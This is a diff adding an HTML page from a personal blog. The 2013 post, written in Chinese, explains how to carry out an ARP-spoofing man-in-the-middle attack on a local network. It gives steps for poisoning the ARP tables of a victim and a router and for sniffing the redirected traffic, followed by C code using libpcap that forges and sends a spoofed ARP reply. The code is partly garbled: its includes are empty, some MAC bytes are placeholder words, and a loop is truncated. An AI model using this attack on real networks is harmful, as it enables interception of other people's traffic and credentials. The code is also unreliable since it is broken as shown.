@@ -1,0 +1,112 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Xinzheng Zhang"><meta name="renderer" content="webkit"><meta name="copyright" content="Xinzheng Zhang"><meta name="keywords" content="Snorlax's blog"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>arp欺骗中间人攻击的实现、arp包解析 · Snorlax's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/akari.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">snorlax</div><div class="profile-signature">アッカリ～ン</div><div class="friends"><div>FRIENDS</div><span><a href="//blog.chenkeyi.com" target="_black">蹦蹬</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Snorlax's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">arp欺骗中间人攻击的实现、arp包解析</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2013-03-20</span></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>首先先是了解下什么arp欺骗 可以参加这篇文章<a href="http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml" target="_blank" rel="noopener">http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml</a><br><br>看完这篇文章我们就可以实施攻击<br><br>1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br><br>2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br><br>3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br><br>4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack’s mac gateway就可以了<br><br>——————ARP表的设置基本完成—————————————————————————-<br><br>接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br><br>然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br><br>——————上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?————<br><br>接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" target="_blank" rel="noopener"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299"></a><br>然后我从真实抓下来的arp进行分析<br><br>首先arp广播包是 42个字节<br><br>arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br><br>然后我贴代码对这42个字节进行具体分析<br><br>因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br><br>不过我发现给在数据连路层上的更好的一组东西:)<br><br>神器不解释啊= =<br><br>详见<br><br><a href="http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html" target="_blank" rel="noopener">http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</a></p>
+
+<p></p><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include</span><br><span class="line">#include</span><br><span class="line"></span><br><span class="line">#include</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    pcap_t *fp;</span><br><span class="line">    char error[PCAP_ERRBUF_SIZE];</span><br><span class="line">    u_char packet[60];</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    /* Check the validity of the command line */</span><br><span class="line">    if (argc != 2)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;usage: %s inerface&quot;, argv[0]);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Open the output adapter */</span><br><span class="line">    if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */</span><br><span class="line">    /*被攻击者的mac*/</span><br><span class="line">    packet[0]=xx;</span><br><span class="line">    packet[1]=32;</span><br><span class="line">    packet[2]=102;</span><br><span class="line">    packet[3]=8;</span><br><span class="line">    packet[4]=jiubu;</span><br><span class="line">    packet[5]=gaosuni;</span><br><span class="line"></span><br><span class="line">    /* set mac source to 2:2:2:2:2:2 */</span><br><span class="line">    /*攻击者的mac*/</span><br><span class="line">    packet[6]=jiu;</span><br><span class="line">    packet[7]=bu;</span><br><span class="line">    packet[8]=gaosu;</span><br><span class="line">    packet[9]=234;</span><br><span class="line">    packet[10]=xx;</span><br><span class="line">    packet[11]=100;</span><br><span class="line">    /*arp*/</span><br><span class="line">    packet[12]=8;</span><br><span class="line">    packet[13]=6;</span><br><span class="line">    /*arp首部*/</span><br><span class="line">    packet[14]=0;</span><br><span class="line">    packet[15]=1;</span><br><span class="line"></span><br><span class="line">    packet[16]=8;</span><br><span class="line">    packet[17]=0;</span><br><span class="line"></span><br><span class="line">    packet[18]=6;</span><br><span class="line">    packet[19]=4;</span><br><span class="line">    packet[20]=0;</span><br><span class="line">    packet[21]=2;</span><br><span class="line">    /*被骗的那个人的arp表上的假mac*/</span><br><span class="line">    packet[22]=jiu;</span><br><span class="line">    packet[23]=154;</span><br><span class="line">    packet[24]=32;</span><br><span class="line">    packet[25]=bu;</span><br><span class="line">    packet[26]=253;</span><br><span class="line">    packet[27]=gao;</span><br><span class="line">    /*被骗者的网关*/</span><br><span class="line">    packet[28]=192;</span><br><span class="line">    packet[29]=168;</span><br><span class="line">    packet[30]=1;</span><br><span class="line">    packet[31]=1;</span><br><span class="line">    /*被攻击者的mac*/</span><br><span class="line">    packet[32]=xx;</span><br><span class="line">    packet[33]=32;</span><br><span class="line">    packet[34]=102;</span><br><span class="line">    packet[35]=xx;</span><br><span class="line">    packet[36]=xx;</span><br><span class="line">    packet[37]=184;</span><br><span class="line">    /*被攻击者的ip*/</span><br><span class="line">    packet[38]=192;</span><br><span class="line">    packet[39]=168;</span><br><span class="line">    packet[40]=1;</span><br><span class="line">    packet[41]=114;</span><br><span class="line"></span><br><span class="line">    /* Fill the rest of the packet */</span><br><span class="line">    /*乱填就好了*/</span><br><span class="line">    for(i=42;i</span><br><span class="line">        packet[i]=i%256;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* Send down the packet */</span><br><span class="line">    pcap_sendpacket(fp,</span><br><span class="line">                    packet,</span><br><span class="line">                    60);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以上arp欺骗的完整实现、不要用来干坏事= =</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://zxz.moe">Xinzheng Zhang</a></p><p> <span>Link:  </span><a href="http://zxz.moe/2013/03/20/2013-2013-03-20-arp欺骗中间人攻击的实现、arp包解析/">http://zxz.moe/2013/03/20/2013-2013-03-20-arp欺骗中间人攻击的实现、arp包解析/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2013/03/26/2013-2013-03-26-注册了-ask-fm/" title="注册了 ask.fm"><span>< PreviousPost</span><br><span class="prevTitle">注册了 ask.fm</span></a><a class="nextSlogan" href="/2013/03/15/2013-2013-03-15-sae-普通开发者免推荐认证活动3-15-解/" title="sae 普通开发者免推荐认证活动3.15 解"><span>NextPost ></span><br><span class="nextTitle">sae 普通开发者免推荐认证活动3.15 解</span></a><div class="clear"></div></div><div id="comment"><div id="disqus_thread"></div><script>var unused = null;
+var disqus_config = function () {
+  this.page.url = 'http://zxz.moe/2013/03/20/2013-2013-03-20-arp欺骗中间人攻击的实现、arp包解析/';
+  this.page.identifier = '2013/03/20/2013-2013-03-20-arp欺骗中间人攻击的实现、arp包解析/';
+  this.page.title = 'arp欺骗中间人攻击的实现、arp包解析';
+}
+var d = document, s = d.createElement('script');
+s.src = "https://" + 'snorlaxzxz' +".disqus.com/embed.js";
+s.setAttribute('data-timestamp', '' + +new Date());
+(d.head || d.body).appendChild(s);</script></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
